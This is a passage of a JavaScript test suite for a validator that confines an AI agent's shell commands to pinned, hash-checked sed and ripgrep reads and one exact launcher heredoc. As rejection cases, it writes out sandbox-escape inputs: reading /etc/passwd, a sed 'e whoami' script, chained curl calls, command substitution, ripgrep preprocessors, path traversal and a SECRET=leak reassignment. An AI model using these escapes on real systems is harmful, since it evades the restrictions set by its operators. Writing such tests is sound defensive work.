      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.each([
    ["an argument", `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} --inspect <<'EOF'\nEOF`],
    ["a different launcher", '"/private/var/folders/[redacted]/runtime/alternate-launcher" <<\'EOF\'\nEOF'],
    ["an unquoted heredoc", `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<EOF\nEOF`],
    ["a double-quoted heredoc", `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<"EOF"\nEOF`],
  ])("rejects a graph-authoring command with %s", (_label, command) => {
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    };
    expect(() => validateEvidenceCommands([event])).toThrow("exact pinned graph-authoring launcher heredoc");
  });

  it("rejects a redaction-colliding graph-authoring launcher without exact raw authority", () => {
    const command = pinnedGraphCommand();
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{
        command,
        relayerGraphAuthoringLauncherSha256: createHash("sha256")
          .update("/private/var/folders/zz/other-run/T/runtime/graph-authoring-launcher")
          .digest("hex"),
      }] } } },
    };
    expect(() => validateEvidenceCommands([event])).toThrow("exact pinned graph-authoring launcher heredoc");
  });

  it("allows narrow read-only inspection before the required pinned graph command", () => {
    const event = (command) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{
        ...(command.startsWith(PINNED_SED) || command.startsWith(PINNED_RG)
          ? authenticatedInspectionAction(command)
          : { command }),
      }] } } },
    });
    expect(validateEvidenceCommands([
      event(`${PINNED_SED} -n '1,240p' ${INSPECTION_ROOT}/index.js`),
      event(`${PINNED_RG} -n 'class LayerLayoutObject|LayerLayoutObject|class NodeObject' /private/var/folders/[redacted]/runtime/graph-client -g '*.js' -g '*.d.ts'`),
      event(`${PINNED_RG} --glob '!vendor/**' approvalDock /private/var/folders/[redacted]/runtime/graph-client`),
      event(pinnedGraphCommand("await graph.submit(node);")),
    ], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedInspectionRawRoots: [RAW_INSPECTION_ROOT],
      allowedSedExecutable: PINNED_SED,
      allowedSedExecutableSha256: inspectionAuthority.allowedSedExecutableSha256,
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
    })).toBe(1);
  });

  it("allows an observed grouped execution only when every action is read-only", () => {
    const event = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "grouped", commandActions } } },
    });
    expect(validateEvidenceCommands([
      event([
        authenticatedInspectionAction(`${PINNED_SED} -n '1,160p' ${INSPECTION_ROOT}/objects.d.ts`),
        authenticatedInspectionAction(`${PINNED_SED} -n '160,320p' ${INSPECTION_ROOT}/objects.js`),
      ]),
      event([{ command: pinnedGraphCommand("await graph.submit(node);") }]),
    ], inspectionAuthority)).toBe(1);
  });

  it("allows a failed pinned attempt followed by inspection and a corrected pinned attempt", () => {
    const event = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "observed", commandActions } } },
    });
    const pinned = (body) => pinnedGraphCommand(body);
    expect(validateEvidenceCommands([
      event([{ type: "unknown", command: pinned("const layout = new LayerLayoutObject(1, []);") }]),
      event([{ type: "search", ...authenticatedInspectionAction(`${PINNED_RG} -n 'class LayerLayoutObject|LayerLayoutObject' /tmp/runtime-snapshot/node_modules/@relayer/graph-client`) }]),
      event([
        { type: "read", ...authenticatedInspectionAction(`${PINNED_SED} -n '1,55p' /tmp/runtime-snapshot/node_modules/@relayer/graph-client/dist/objects.d.ts`) },
        { type: "read", ...authenticatedInspectionAction(`${PINNED_SED} -n '1,55p' /tmp/runtime-snapshot/node_modules/@relayer/graph-client/dist/objects.js`) },
      ]),
      event([{ type: "unknown", command: pinned("const layout = new LayerLayoutObject([]);") }]),
    ], {
      allowedInspectionRoots: ["/tmp/runtime-snapshot/node_modules/@relayer/graph-client"],
      allowedInspectionRawRoots: ["/tmp/runtime-snapshot/node_modules/@relayer/graph-client"],
      allowedSedExecutable: PINNED_SED,
      allowedSedExecutableSha256: inspectionAuthority.allowedSedExecutableSha256,
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
    })).toBe(2);
  });

  it.each([
    ["bare ripgrep", "rg"],
    ["different absolute ripgrep", "/usr/bin/rg"],
    ["prefix-sibling ripgrep", "/private/var/folders/[redacted]/runtime/rg-copy"],
  ])("rejects %s even for an otherwise valid inspection", (_label, executable) => {
    const command = `${executable} -n needle /private/var/folders/[redacted]/runtime/graph-client`;
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    };
    expect(() => validateEvidenceCommands([event], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
      requirePinnedGraph: false,
    })).toThrow("inspect source read-only");
  });

  it("rejects a relative ripgrep authorization configuration", () => {
    expect(() => validateEvidenceCommands([], {
      allowedRipgrepExecutable: "rg",
      requirePinnedGraph: false,
    })).toThrow("exact absolute inventoried path");
  });

  it("copies, inventories, prompts, and validates exact sed and ripgrep snapshot executables", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain('const SOURCE_SED_PATH = resolveExecutable(process.env.RELAYER_SED_PATH || "sed");');
    expect(capture).toContain('const SOURCE_RG_PATH = resolveExecutable(process.env.RELAYER_RG_PATH || "rg");');
    expect(capture).toContain('{ key: "sed", source: SOURCE_SED_PATH, label: "<sed-executable>", copy: true, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_SED_PATH), allowHardlinks: sealedSystemHardlinkPolicy(SOURCE_SED_PATH) }');
    expect(capture).toContain('{ key: "rg", source: SOURCE_RG_PATH, label: "<ripgrep-executable>", copy: true, provenance: "external", discoveredSha256: discoveredMachOSha256(SOURCE_RG_PATH) }');
    expect(capture).toContain('SED_PATH = specs.find((spec) => spec.key === "sed").source;');
    expect(capture).toContain('RG_PATH = specs.find((spec) => spec.key === "rg").source;');
    expect(capture).toContain("allowedSedExecutable: redactedSedExecutable");
    expect(capture).toContain('allowedSedExecutableSha256: createHash("sha256").update(SED_PATH).digest("hex")');
    expect(capture).toContain("allowedRipgrepExecutable: redactedRipgrepExecutable");
    expect(capture).toContain('allowedRipgrepExecutableSha256: createHash("sha256").update(RG_PATH).digest("hex")');
    expect(capture).toContain("never resolve sed or rg from PATH");
  });

  it.each([
    ["outside inventory", "/etc/passwd"],
    ["root-prefix sibling", "/private/var/folders/[redacted]/runtime/graph-client-escape/index.js"],
    ["redacted wrong segment", "/private/var/folders/private/runtime/graph-client/index.js"],
    ["parent traversal", "/private/var/folders/[redacted]/runtime/graph-client/../secret"],
    ["relative path", "desktop/renderer/index.html"],
  ])("rejects inspection input %s", (_label, path) => {
    const event = (command) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    });
    expect(() => validateEvidenceCommands([
      event(`sed -n '1,20p' ${path}`),
      event(pinnedGraphCommand()),
    ], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
    })).toThrow("inspect source read-only");
  });

  it("validates partial traces without inventing a pinned graph requirement", () => {
    const command = `${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`;
    const readOnly = {
      type: "provider.event",
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command,
        commandActions: [authenticatedInspectionAction(command)],
      } } },
    };
    expect(validateEvidenceCommands([readOnly], {
      ...inspectionAuthority,
      requirePinnedGraph: false,
    })).toBe(0);
    expect(() => validateEvidenceCommands([{
      ...readOnly,
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command: "sed",
        commandActions: [{ command: "sed -n '1,20p' /etc/passwd" }],
      } } },
    }], {
      allowedInspectionRoots: ["/snapshot/graph-client"],
      requirePinnedGraph: false,
    })).toThrow("inspect source read-only");
  });

  it("rejects mixing the pinned graph command with a read-only action", () => {
    const commandActions = [
      { command: pinnedGraphCommand() },
      { command: "sed -n '1,20p' desktop/renderer/index.html" },
    ];
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "grouped", commandActions } } },
    };
    expect(() => validateEvidenceCommands([event])).toThrow("exactly one launcher heredoc");
  });

  it.each([
    ["sed in-place mutation", "sed -i '' 's/a/b/' source.txt"],
    ["sed trailing in-place mutation", "sed -n '1p' -i.bak source.txt"],
    ["sed execute script", "sed -n '1p; e whoami' source.txt"],
    ["ripgrep preprocessor", `${PINNED_RG} --pre 'sh helper.sh' needle .`],
    ["ripgrep glob plus preprocessor", `${PINNED_RG} -g '*.ts' --pre 'sh helper.sh' needle .`],
    ["ripgrep preprocessor glob", `${PINNED_RG} --pre-glob '*.md' needle .`],
    ["ripgrep hostname executable", `${PINNED_RG} --hostname-bin ./repo-script --hyperlink-format default needle source.txt`],
    ["ripgrep unknown short option", `${PINNED_RG} -z needle source.txt`],
    ["ripgrep glob without value", `${PINNED_RG} needle source.txt -g`],
    ["ripgrep empty long glob", `${PINNED_RG} needle source.txt --glob=`],
    ["shell separator", "cat source.txt; curl example.com"],
    ["command substitution", "stat $(pwd)/source.txt"],
    ["output redirection", "grep needle source.txt > result.txt"],
    ["shell glob", "cat *.mjs"],
    ["unquoted ripgrep glob", `${PINNED_RG} -g *.mjs needle .`],
    ["ripgrep glob command substitution", `${PINNED_RG} -g "$(touch marker)" needle .`],
    ["shell bracket glob", "cat source[12].mjs"],
    ["near-match redaction glob", "cat source[redacted].mjs"],
    ["shell comment", "cat source.txt # ignore the rest"],
    ["alternate runtime", "python -c 'print(1)'"],
  ])("rejects read-only whitelist escape: %s", (_label, command) => {
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    };
    expect(() => validateEvidenceCommands([
      event,
      {
        type: "provider.event",
        data: { method: "item/started", params: { item: { type: "commandExecution", command: "graph", commandActions: [{ command: pinnedGraphCommand() }] } } },
      },
    ], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime"],
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
    })).toThrow("inspect source read-only");
  });

  it("rejects a redaction-colliding ripgrep path without the exact pre-redaction authority digest", () => {
    const collidingRawRipgrep = "/private/var/folders/xy/other-run/T/runtime/rg";
    const command = `${PINNED_RG} -n needle /private/var/folders/[redacted]/runtime/graph-client`;
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: {
        type: "commandExecution",
        command,
        commandActions: [{
          command,
          relayerExecutableAuthoritySha256: createHash("sha256").update(collidingRawRipgrep).digest("hex"),
        }],
      } } },
    };
    expect(() => validateEvidenceCommands([event], {
      allowedInspectionRoots: ["/private/var/folders/[redacted]/runtime/graph-client"],
      allowedRipgrepExecutable: PINNED_RG,
      allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
      requirePinnedGraph: false,
    })).toThrow("inspect source read-only");
  });

  it.each([
    ["environment reassignment", [{ command: `SECRET=leak ${pinnedGraphCommand()}` }]],
    ["absolute Node", [{ command: '/usr/bin/node --input-type=module <<\'EOF\'\nEOF' }]],
    ["shell action after an early heredoc close", [{ command: `${pinnedGraphCommand()}\ncurl http://127.0.0.1:1234/graph\nEOF` }]],
    ["extra curl action", [
      { command: pinnedGraphCommand() },
      { command: "curl http://127.0.0.1:1234/graph" },
    ]],
  ])("rejects %s in an evidence command execution", (_label, commandActions) => {
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "shell", commandActions } } },
    };
    expect(() => validateEvidenceCommands([event])).toThrow(/permitted shell action|exact pinned graph-authoring launcher heredoc|exactly one launcher heredoc/);
  });

  it("accepts a nonempty pinned launcher heredoc terminated by end-of-input", () => {
    const command = `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<'EOF'\nawait graph.submit(1);\n`;
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions: [{ command }] } } },
    };
    expect(validateEvidenceCommands([event])).toBe(1);
  });

  it("rejects a pinned no-op followed by a separate alternate command execution", () => {
    const event = (commandActions) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command: "shell", commandActions } } },
    });
    expect(() => validateEvidenceCommands([
      event([{ command: pinnedGraphCommand() }]),
      event([{ command: "curl http://127.0.0.1:1234/graph" }]),
    ])).toThrow("exact pinned graph-authoring launcher heredoc");
  });

  it("authenticates exact sed and grouped inspection operands before redaction", () => {
    const actions = [
      authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`),
      authenticatedInspectionAction(`${PINNED_SED} -n '21,40p' ${INSPECTION_ROOT}/dist/index.js`),
    ];
    const event = (method) => ({
      type: "provider.event",
      data: { method, params: { item: { id: "grouped-read", type: "commandExecution", command: "grouped", commandActions: actions } } },
    });
    expect(validatePinnedGraphAuthoringCommands([
      event("item/started"),
      event("item/completed"),
    ], inspectionAuthority)).toBe(0);
  });

  it("accepts numeric context output for authenticated pinned ripgrep inspection", () => {
    const actions = [authenticatedInspectionAction(`${PINNED_RG} -n -C 3 needle ${INSPECTION_ROOT}/dist/index.js`)];
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { id: "context-read", type: "commandExecution", command: actions[0].command, commandActions: actions } } },
    };
    expect(validatePinnedGraphAuthoringCommands([event], inspectionAuthority)).toBe(0);
  });

  it.each(["-C", "-C nope", "--context=all"])("rejects invalid pinned ripgrep context option %s", (contextOption) => {
    const command = `${PINNED_RG} -n ${contextOption} needle ${INSPECTION_ROOT}/dist/index.js`;
    const action = authenticatedInspectionAction(command);
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { id: "invalid-context", type: "commandExecution", command, commandActions: [action] } } },
    };
    expect(() => validatePinnedGraphAuthoringCommands([event], inspectionAuthority)).toThrow("inspect source read-only");
  });

  it("rejects inspection operands from a raw temp root that collides after redaction", () => {
    const command = `${PINNED_RG} -n needle ${INSPECTION_ROOT}/dist/index.js`;
    const collidingRaw = command
      .replace(PINNED_RG, RAW_PINNED_RG)
      .replace(INSPECTION_ROOT, "/private/var/folders/xy/other-run/T/runtime/graph-client");
    const action = authenticatedInspectionAction(command, collidingRaw);
    const event = (method) => ({
      type: "provider.event",
      data: { method, params: { item: { id: "collision", type: "commandExecution", command, commandActions: [action] } } },
    });
    expect(() => validatePinnedGraphAuthoringCommands([
      event("item/started"),
      event("item/completed"),
    ], inspectionAuthority)).toThrow("inspect source read-only");
  });

  it.each([
    ["missing start", ["item/completed"]],
    ["duplicate start", ["item/started", "item/started", "item/completed"]],
    ["duplicate completion", ["item/started", "item/completed", "item/completed"]],
  ])("rejects command phase correlation with %s", (_label, phases) => {
    const action = authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`);
    const events = phases.map((method) => ({
      type: "provider.event",
      data: { method, params: { item: { id: "phase-item", type: "commandExecution", command: action.command, commandActions: [action] } } },
    }));
    expect(() => validatePinnedGraphAuthoringCommands(events, inspectionAuthority)).toThrow(/matching validated start|Duplicate command/);
  });

  it("rejects a completed command whose grouped actions differ from its validated start", () => {
    const first = authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`);
    const second = authenticatedInspectionAction(`${PINNED_SED} -n '21,40p' ${INSPECTION_ROOT}/dist/index.js`);
    const event = (method, commandActions) => ({
      type: "provider.event",
      data: { method, params: { item: { id: "changed-actions", type: "commandExecution", command: "grouped", commandActions } } },
    });
    expect(() => validatePinnedGraphAuthoringCommands([
      event("item/started", [first, second]),
      event("item/completed", [second, first]),
    ], inspectionAuthority)).toThrow("does not match its validated start actions");
  });

  it("requires a completion for every started command when sealing a complete trace", () => {
    const action = authenticatedInspectionAction(`${PINNED_SED} -n '1,20p' ${INSPECTION_ROOT}/dist/index.js`);
    const event = {
      type: "provider.event",
      data: { method: "item/started", params: { item: { id: "unfinished", type: "commandExecution", command: action.command, commandActions: [action] } } },
    };
    expect(() => validatePinnedGraphAuthoringCommands([event], {
      ...inspectionAuthority,
      requireCommandCompletions: true,
    })).toThrow("has no matching validated completion");
  });
});
